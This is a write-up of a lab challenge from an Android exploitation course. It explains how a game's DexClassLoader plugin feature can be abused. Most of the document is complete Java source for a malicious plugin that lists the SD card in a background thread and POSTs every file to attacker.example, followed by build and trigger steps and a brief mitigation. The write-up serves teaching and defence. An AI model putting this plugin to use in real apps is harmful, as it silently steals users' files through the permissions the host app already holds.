# DroidWars — The Plugins Race

> **Course:** [Android Application Exploitation Challenges](https://academy.8ksec.io/course/android-application-exploitation-challenges)
> **Focus:** Dynamic code loading abuse (DexClassLoader)
> Android 15 · non-rooted

## Goal

A game platform **dynamically loads plugins** (DEX/JAR) from storage via a
"Refresh" feature. Craft a legitimate-looking plugin that steals SD card
files in the background — inheriting the game's permissions.

## Solution

### 1 — Understand the plugin contract (JADX)

Find the loader:

```java
DexClassLoader cl = new DexClassLoader(
    pluginPath, optimizedDir, null, getClassLoader());
Class<?> plugin = cl.loadClass("com.droidwars.plugins.RacePlugin");
IRacePlugin p = (IRacePlugin) plugin.newInstance();
p.onStart(gameContext);      // entry point the host calls
```

Note the **interface** the plugin must implement (package + method names) —
the host casts to it reflectively.

### 2 — Craft the malicious plugin

```java
package com.droidwars.plugins;

public class RacePlugin implements IRacePlugin {
    @Override
    public void onStart(android.content.Context ctx) {
        new Thread(() -> {
            try {
                // game owns READ_EXTERNAL_STORAGE → we inherit it
                java.io.File sd = android.os.Environment
                        .getExternalStorageDirectory();
                for (java.io.File f : sd.listFiles()) {
                    // exfiltrate to the attacker endpoint
                    java.net.HttpURLConnection c = (java.net.HttpURLConnection)
                        new java.net.URL("https://attacker.example/loot?f=" + f.getName())
                        .openConnection();
                    c.setDoOutput(true); c.setRequestMethod("POST");
                    java.io.FileInputStream in = new java.io.FileInputStream(f);
                    byte[] b = new byte[4096]; int n;
                    java.io.OutputStream os = c.getOutputStream();
                    while ((n = in.read(b)) > 0) os.write(b, 0, n);
                    in.close(); os.close();
                }
            } catch (Exception ignored) {}
        }).start();
    }
}
```

Build it against the host's interface (compile the stub `IRacePlugin`
aidl/class from JADX export), `d8`/`dx` it into a JAR, place it at the
plugin path on the SD card.

### 3 — Trigger

Tap **Refresh** in the game — the loader loads the DEX, calls `onStart`,
and SD card files stream to the endpoint — lab solved.

## Mitigation

Verify plugin signatures against a pinned key, load plugins from private
storage only, and never inherit the host's permission set for
third-party code.
